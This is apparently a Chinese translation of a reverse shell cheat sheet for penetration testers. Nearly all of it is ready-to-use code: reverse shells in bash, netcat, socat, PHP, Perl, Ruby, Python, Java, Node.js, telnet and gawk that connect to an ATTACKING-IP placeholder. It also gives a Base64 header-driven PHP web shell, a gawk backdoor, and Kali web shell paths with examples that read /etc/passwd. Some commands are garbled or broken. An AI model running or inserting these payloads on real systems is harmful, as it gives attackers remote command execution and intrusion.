# 反弹shell
# 反向shell备忘单|Reverse Shell Cheat Sheet

[2021年6月16日](https://www.ddosi.com/reverse-shell/ "下午4:47") [雨苁](https://www.ddosi.com/author/__g2r__w5__x8x__n75/ "View all posts by 雨苁") [技能树](https://www.ddosi.com/category/%e6%8a%80%e8%83%bd%e6%a0%91/), [渗透测试](https://www.ddosi.com/category/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/), [黑客技术](https://www.ddosi.com/category/%e9%bb%91%e5%ae%a2%e6%8a%80%e6%9c%af/)

目录导航

- [设置监听 Netcat](https://www.ddosi.com/reverse-shell/#%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC_Netcat "设置监听 Netcat")
    - [在允许的端口上设置您的 Netcat 侦听 shell](https://www.ddosi.com/reverse-shell/#%E5%9C%A8%E5%85%81%E8%AE%B8%E7%9A%84%E7%AB%AF%E5%8F%A3%E4%B8%8A%E8%AE%BE%E7%BD%AE%E6%82%A8%E7%9A%84_Netcat_%E4%BE%A6%E5%90%AC_shell "在允许的端口上设置您的 Netcat 侦听 shell")
    - [NAT 需要端口转发](https://www.ddosi.com/reverse-shell/#NAT_%E9%9C%80%E8%A6%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91 "NAT 需要端口转发")
- [Bash反向Shell](https://www.ddosi.com/reverse-shell/#Bash%E5%8F%8D%E5%90%91Shell "Bash反向Shell")
- [socat反向shell](https://www.ddosi.com/reverse-shell/#socat%E5%8F%8D%E5%90%91shell "socat反向shell")
- [Golang反向Shell](https://www.ddosi.com/reverse-shell/#Golang%E5%8F%8D%E5%90%91Shell "Golang反向Shell")
- [PHP反向Shell](https://www.ddosi.com/reverse-shell/#PHP%E5%8F%8D%E5%90%91Shell "PHP反向Shell")
- [Netcat反向 Shell](https://www.ddosi.com/reverse-shell/#Netcat%E5%8F%8D%E5%90%91_Shell "Netcat反向 Shell ")
- [Node.js反向Shell](https://www.ddosi.com/reverse-shell/#Nodejs%E5%8F%8D%E5%90%91Shell "Node.js反向Shell")
- [Telnet反向Shell](https://www.ddosi.com/reverse-shell/#Telnet%E5%8F%8D%E5%90%91Shell "Telnet反向Shell")
- [Perl反向Shell](https://www.ddosi.com/reverse-shell/#Perl%E5%8F%8D%E5%90%91Shell "Perl反向Shell ")
    - [Perl Windows反向Shell](https://www.ddosi.com/reverse-shell/#Perl_Windows%E5%8F%8D%E5%90%91Shell "Perl Windows反向Shell ")
- [Ruby反向Shell](https://www.ddosi.com/reverse-shell/#Ruby%E5%8F%8D%E5%90%91Shell "Ruby反向Shell ")
- [Java反向Shell](https://www.ddosi.com/reverse-shell/#Java%E5%8F%8D%E5%90%91Shell "Java反向Shell ")
- [Python反向Shell](https://www.ddosi.com/reverse-shell/#Python%E5%8F%8D%E5%90%91Shell "Python反向Shell ")
- [Gawk反向Shell](https://www.ddosi.com/reverse-shell/#Gawk%E5%8F%8D%E5%90%91Shell "Gawk反向Shell ")
- [Kali Web Shell](https://www.ddosi.com/reverse-shell/#Kali_Web_Shell "Kali Web Shell")
    - [Kali PHP Web Shell](https://www.ddosi.com/reverse-shell/#Kali_PHP_Web_Shell "Kali PHP Web Shell")
    - [提示：执行反向 Shell](https://www.ddosi.com/reverse-shell/#%E6%8F%90%E7%A4%BA%EF%BC%9A%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%90%91_Shell "提示：执行反向 Shell")
    - [Kali Perl反向Shell](https://www.ddosi.com/reverse-shell/#Kali_Perl%E5%8F%8D%E5%90%91Shell "Kali Perl反向Shell")
    - [Kali Cold Fusion shell](https://www.ddosi.com/reverse-shell/#Kali_Cold_Fusion_shell "Kali Cold Fusion shell")
    - [Kali ASP shell](https://www.ddosi.com/reverse-shell/#Kali_ASP_shell "Kali ASP shell")
    - [Kali ASPX shell](https://www.ddosi.com/reverse-shell/#Kali_ASPX_shell "Kali ASPX  shell ")
    - [Kali JSP 反向 Shell](https://www.ddosi.com/reverse-shell/#Kali_JSP_%E5%8F%8D%E5%90%91_Shell "Kali JSP 反向 Shell")

在渗透测试期间，如果您足够幸运地发现远程命令执行漏洞，您通常会想连接回攻击机器以利用交互式 shell。

下面是一组使用常用编程语言或常用二进制文件（nc、telnet、bash 等）的**反向 shell**。

文章底部是 Kali Linux 中可上传的反向 shell 的集合。

如果您发现此资源有用，您还应该查看我们的渗透测试工具备忘单，其中包含一些额外的反向 shell 和其他在执行渗透测试时有用的命令。

## 设置监听 Netcat[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#setup-listening-netcat)

您的远程 shell 将需要一个侦听 netcat 实例才能重新连接。

### 在允许的端口上设置您的 Netcat 侦听 shell

使用目标网络上的出站防火墙规则可能允许的端口，例如 80 / 443

要设置监听 netcat 实例，请输入以下内容：

```
root@ddosi.com_kali:~# nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
```

### NAT 需要端口转发

如果您的攻击机器是 NAT 路由器，您需要设置一个端口转发到攻击机器的 IP / 端口。

**ATTACKING-IP**是运行您的侦听 netcat 会话的机器，端口 80 用于以下所有示例（出于上述原因）。

## Bash反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells)

```
exec /bin/bash 0&0 2>&0

```

```
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

```

```
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

```
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

## socat反向shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#socat-reverse-shell)

资料来源：@filip_dragovic

```
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
```

## Golang反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#golang-reverse-shell)

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

## PHP反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)

一个有用的PHP反向 shell：

```
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

另一个 PHP反向shell（通过 Twitter 提交）：

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```

由@0xInfection 加密的 Base64：

```
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

## Netcat反向 Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell)

[![反向shell备忘单|Reverse Shell Cheat Sheet](_v_images/20210630095106536_19270.png)](https://www.ddosi.com/wp-content/uploads/2021/06/006-3.png)

有用的 netcat 反向shell 示例：

不要忘记启动您的侦听器，否则您将无法捕捉到任何 Shell ![🙂](_v_images/20210630095106324_19077.svg)

```
nc -lnvp 80
```

```
nc -e /bin/sh ATTACKING-IP 80
```

```
/bin/sh | nc ATTACKING-IP 80
```

```
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

[@0xatul](https://twitter.com/atul_hax)提交的反向 shell，它适用于 OpenBSD netcat 而不是 GNU nc：

```
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

## Node.js反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#nodejs-reverse-shell)

```
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
```

资料来源：@jobertabma 通过@JaneScott

## Telnet反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell)

```
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

记住还要在攻击机器上收听 443。

## Perl反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell)

```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl Windows反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell)

```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell)

```
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell)

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Python反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Gawk反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell)

@dmfroberson 看一看一个 liner rev shell：

```
gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
```

```
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Kali Web Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-web-shells)

[![反向shell备忘单|Reverse Shell Cheat Sheet](_v_images/20210630095105411_25606.png)](https://www.ddosi.com/wp-content/uploads/2021/06/004-2.png)

Kali Linux 中存在以下 shell，`/usr/share/webshells/`它们仅在您能够上传、注入或传输 shell 到机器时才有用。

### Kali PHP Web Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-php-web-shells)

Kali PHP 反向 shell 和命令 shell：

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/php/  php-reverse-shell.php` | Pen Test Monkey – PHP 反向 Shell |
| `/usr/share/webshells/  php/php-findsock-shell.php``/usr/share/webshells/  php/findsock.c` | Pen Test Monkey，Findsock Shell。构建`gcc -o findsock findsock.c`（注意目标服务器架构），使用 netcat 而不是浏览器执行`nc -v target 80` |
| `/usr/share/webshells/  php/simple-backdoor.php` | PHP 后门，如果可以上传/代码注入，则对 CMD 执行很有用，用法： `http://target.com/simple-  backdoor.php?cmd=cat+/etc/passwd` |
| `/usr/share/webshells/  php/php-backdoor.php` | 更大的 PHP shell，带有用于命令执行的文本输入框。 |

[![反向shell备忘单|Reverse Shell Cheat Sheet](_v_images/20210630095105198_3559.png)](https://www.ddosi.com/wp-content/uploads/2021/06/005-3.png)

### 提示：执行反向 Shell

上面的最后两个 shell 不是反向 shell，但是它们对于执行反向 shell 很有用。

### Kali Perl反向Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-perl-reverse-shell)

Kali perl反向Shell:

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/perl/  perl-reverse-shell.pl` | Pen Test Monkey – Perl 反向 Shell |
| `/usr/share/webshells/  perl/perlcmd.cgi` | Pen Test Monkey，Perl Shell  用法：`http://target.com/perlcmd.cgi?cat /etc/passwd` |

### Kali Cold Fusion shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-cold-fusion-shell)

Kali Coldfusion shell：

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/cfm/cfexec.cfm` | 冷聚变shell – 又名 CFM shell |

### Kali ASP shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-asp-shell)

经典的 ASP 反向shell + CMD shell ：

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/asp/` | Kali ASP shell |

### Kali ASPX shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells)

Kali 中的 ASP.NET 反向 shell：

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/aspx/` | Kali ASPX shell |

### Kali JSP 反向 Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-jsp-reverse-shell)

Kali JSP 反向 shell ：

| 命令 | 描述 |
| --- | --- |
| `/usr/share/webshells/jsp/jsp-reverse.jsp` | Kali JSP 反向 Shell |

[from](https://highon.coffee/blog/reverse-shell-cheat-sheet/)